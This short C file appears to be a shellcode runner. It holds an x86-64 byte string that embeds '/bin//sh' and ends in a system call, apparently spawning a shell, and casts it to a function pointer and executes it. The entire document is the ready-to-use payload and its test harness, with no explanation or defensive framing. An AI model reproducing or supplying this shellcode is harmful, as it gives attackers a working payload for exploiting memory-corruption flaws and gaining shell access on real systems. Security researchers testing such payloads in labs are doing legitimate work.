char shellcode[] = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x4d\x31\xc0\x49\x01\xd0\x4d\x31\xc0\x49\x01\xd0\x0f\x05";
int main(){
    void (*fp) (void);
    fp = (void *)shellcode;
    fp();
}
